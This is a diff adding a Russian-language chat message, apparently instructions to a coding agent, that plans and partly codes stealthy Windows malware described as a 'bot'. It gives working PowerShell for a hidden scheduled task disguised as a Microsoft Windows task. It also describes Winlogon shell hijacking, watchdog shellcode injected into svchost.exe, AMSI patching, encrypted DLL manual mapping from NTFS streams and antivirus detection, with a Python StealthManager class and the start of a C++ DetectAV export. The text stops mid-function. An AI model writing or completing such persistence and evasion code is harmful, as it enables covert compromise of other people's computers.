@@ -1,0 +1,95 @@
+непорядок( bardak), [30 мар. 2026 в 20:32]
+· При запуске бот проверяет обе точки и, если одна повреждена, восстанавливает из другой.
+3. Восстановление при загрузке системы:
+   · Добавляем запись в автозагрузку реестра, но не обычным способом, а через Winlogon\Shell (подмена оболочки).
+          Например, указываем вместо explorer.exe наш загрузчик, который потом запускает explorer. Но это рискованный метод.
+          Лучше использовать планировщик задач с триггером при запуске системы, скрывая задачу под видом задачи Windows (\Microsoft\Windows\Application Experience\...).
+   Создание скрытой задачи через PowerShell (однократно):
+  
+   $action = New-ScheduledTaskAction -Execute "rundll32.exe" -Argument "shell32.dll,ShellExec_RunDLL <наш_загрузчик>"
+   $trigger = New-ScheduledTaskTrigger -AtStartup
+   $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+   Register-ScheduledTask -TaskName "\Microsoft\Windows\NetTrace\GatherNetworkInfo" -Action $action -Trigger $trigger -Settings $settings -Force
+   
+   · Это создаст задачу в защищённой папке, которая не удаляется стандартными средствами.
+4. Устойчивость к сбросу реестра: если антивирус очищает автозагрузку, бот восстанавливается через watchdog (который работает в системном процессе) и заново прописывает себя.
+
+---
+
+4. Фрагменты кода для ключевых компонентов (в помощь агенту)
+
+4.1. Python-модуль stealth.py (управление всеми стелс-функциями)
+
+import ctypes
+import os
+import sys
+import time
+import random
+import hashlib
+from Crypto.Cipher import AES  # pycryptodome
+
+class StealthManager:
+    def __init__(self):
+        self.dll = None
+        self.watchdog_injected = False
+        self.av_detected = False
+        self.transport_mode = "winhttp"  # или "ie"
+
+    def init(self):
+        # Загрузить обфусцированную DLL с функциями инжекции, патчинга AMSI и т.д.
+        self.load_obfuscated_dll()
+        # Проверить, активен ли watchdog (по наличию пайпа)
+        if not self.check_watchdog():
+            self.inject_watchdog()
+        # Проверить антивирусы
+        self.av_detected = self.detect_antivirus()
+        if self.av_detected:
+            self.apply_stealth_mode()
+        # Запустить эмулятор (в DLL)
+        self.start_emulator()
+        # Настроить транспорт
+        self.configure_transport()
+
+    def load_obfuscated_dll(self):
+        # Чтение зашифрованной DLL из NTFS потока или реестра, расшифровка
+        dll_data = self.read_encrypted_resource()
+        # Ручное отображение DLL в память (manual mapping)
+        self.dll = manual_map_dll(dll_data)
+        # Получить адреса функций
+        self.inject_func = self.dll.get_proc("InjectIntoSystemProcess")
+        self.patch_amsi_func = self.dll.get_proc("PatchAmsi")
+        # ...
+
+    def inject_watchdog(self):
+        # Вызвать инжектор из DLL
+        self.inject_func("svchost.exe", watchdog_shellcode)
+        self.watchdog_injected = True
+
+    def detect_antivirus(self):
+        # Вызвать функцию из DLL, которая возвращает битовую маску
+        return self.dll.get_proc("DetectAV")()
+
+    def apply_stealth_mode(self):
+        # Увеличить задержки, изменить транспорт и т.д.
+        # Сохранить настройки в реестре
+        pass
+
+    def configure_transport(self):
+        if self.av_detected:
+            self.transport_mode = "ie"
+        # Инициализировать HTTP-сессию
+        self.http = StealthHTTP(self.transport_mode)
+
+    def start_emulator(self):
+        self.dll.get_proc("StartEmulator")()
+4.2. C++ функции для DLL (экспортируемые)
+
+detect_av.cpp:
+
+`cpp
+extern "C" __declspec(dllexport) int DetectAV() {
+    int flags = 0;
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
+    if (Process32First(hSnap, &pe)) {
+        do {
